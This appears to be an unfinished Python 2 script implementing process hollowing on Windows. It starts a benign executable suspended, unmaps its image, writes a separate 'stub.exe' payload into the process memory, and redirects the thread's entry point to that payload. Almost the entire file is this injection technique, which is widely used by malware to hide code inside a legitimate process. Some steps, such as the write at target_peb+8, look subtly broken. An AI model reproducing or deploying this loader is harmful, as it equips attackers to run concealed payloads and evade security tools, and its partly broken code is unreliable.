import sys

from ctypes import *
from pefile import PE

from winappdbg import Process

payload_exe = r'stub.exe'
target_exe = r'Helloworld.exe'
stepcount = 1

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x4
PAGE_EXECUTE_READWRITE = 0x40


class ProcessInformation(Structure):
    _fields_ = [
        ('hProcess', c_void_p),
        ('hThread', c_void_p),
        ('dwProcessId', c_ulong),
        ('dwThreadId', c_ulong)]


class STARTUPINFO(Structure):
    _fields_ = [
        ('cb', c_ulong),
        ('lpReserved', c_char_p),
        ('lpDesktop', c_char_p),
        ('lpTitle', c_char_p),
        ('dwX', c_ulong),
        ('dwY', c_ulong),
        ('dwXSize', c_ulong),
        ('dwYSize', c_ulong),
        ('dwXCountChars', c_ulong),
        ('dwYCountChars', c_ulong),
        ('dwFillAttribute', c_ulong),
        ('dwFlags', c_ulong),
        ('wShowWindow', c_ushort),
        ('cbReserved2', c_ushort),
        ('lpReserved2', c_ulong),
        ('hStdInput', c_void_p),
        ('hStdOutput', c_void_p),
        ('hStdError', c_void_p)]


class FLOATING_SAVE_AREA(Structure):
    _fields_ = [
        ("ControlWord", c_ulong),
        ("StatusWord", c_ulong),
        ("TagWord", c_ulong),
        ("ErrorOffset", c_ulong),
        ("ErrorSelector", c_ulong),
        ("DataOffset", c_ulong),
        ("DataSelector", c_ulong),
        ("RegisterArea", c_ubyte * 80),
        ("Cr0NpxState", c_ulong)]


class CONTEXT(Structure):
    _fields_ = [
        ("ContextFlags", c_ulong),
        ("Dr0", c_ulong),
        ("Dr1", c_ulong),
        ("Dr2", c_ulong),
        ("Dr3", c_ulong),
        ("Dr6", c_ulong),
        ("Dr7", c_ulong),
        ("FloatSave", FLOATING_SAVE_AREA),
        ("SegGs", c_ulong),
        ("SegFs", c_ulong),
        ("SegEs", c_ulong),
        ("SegDs", c_ulong),
        ("Edi", c_ulong),
        ("Esi", c_ulong),
        ("Ebx", c_ulong),
        ("Edx", c_ulong),
        ("Ecx", c_ulong),
        ("Eax", c_ulong),
        ("Ebp", c_ulong),
        ("Eip", c_ulong),
        ("SegCs", c_ulong),
        ("EFlags", c_ulong),
        ("Esp", c_ulong),
        ("SegSs", c_ulong),
        ("ExtendedRegisters", c_ubyte * 512)]


def error():
    print "[!]Error: " + FormatError(GetLastError())
    print "[!]Exiting"
    print "[!]The process may still be running"
    sys.exit()


print "[" + str(stepcount) + "]Creating Suspended Process"
stepcount += 1

startupinfo = STARTUPINFO()
startupinfo.cb = sizeof(STARTUPINFO)
processinfo = ProcessInformation()

CREATE_SUSPENDED = 0x0004
if windll.kernel32.CreateProcessA(
        None,
        target_exe,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        byref(startupinfo),
        byref(processinfo)) == 0:
    error()

cx = CONTEXT()
cx.ContextFlags = 0x10007


hProcess = processinfo.hProcess
hThread = processinfo.hThread

base = c_int(0)

target_peb = Process(processinfo.dwProcessId).get_peb().ImageBaseAddress

print "\t[+]Successfully created suspended process! PID: " + str(processinfo.dwProcessId)
print
print "[" + str(stepcount) +"]Reading Payload PE file"
stepcount += 1

payload = PE(payload_exe)
payload_data = payload.get_memory_mapped_image()
payload_size = len(payload_data)

print "\t[+]Payload size: " + str(payload_size)

windll.ntdll.NtUnmapViewOfSection(
    hProcess,
    target_peb
)

print windll.kernel32.VirtualAllocEx(
                                hProcess,
                                target_peb,
                                payload.OPTIONAL_HEADER.SizeOfImage,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE)

lpNumberOfBytesWritten = c_size_t(0)


windll.kernel32.WriteProcessMemory(
    hProcess,
    target_peb,
    create_string_buffer(payload_data),
    payload.OPTIONAL_HEADER.SizeOfHeaders,
    byref(lpNumberOfBytesWritten)
)
print 'lpNumberOfBytesWritten:', lpNumberOfBytesWritten

for section in payload.sections:

    windll.kernel32.WriteProcessMemory(
            hProcess,
            target_peb + section.VirtualAddress,
            create_string_buffer(section.get_data()),
            section.SizeOfRawData,
            byref(lpNumberOfBytesWritten))
    print(hex(target_peb + section.VirtualAddress), lpNumberOfBytesWritten)


print(hProcess, target_peb + 8, payload.OPTIONAL_HEADER.ImageBase, 4,)


print(windll.kernel32.WriteProcessMemory(
    hProcess,
    c_char_p(target_peb + 8),
    payload.OPTIONAL_HEADER.ImageBase,
    4,
    byref(lpNumberOfBytesWritten)
    ), lpNumberOfBytesWritten
)
print(FormatError(GetLastError()))

cx = CONTEXT()
cx.ContextFlags = 0x10007

print windll.kernel32.GetThreadContext(hThread, byref(cx))

cx.Eax = payload.OPTIONAL_HEADER.ImageBase + payload.OPTIONAL_HEADER.AddressOfEntryPoint

print(windll.kernel32.SetThreadContext(hThread, byref(cx)))

# print windll.kernel32.ResumeThread(hThread)
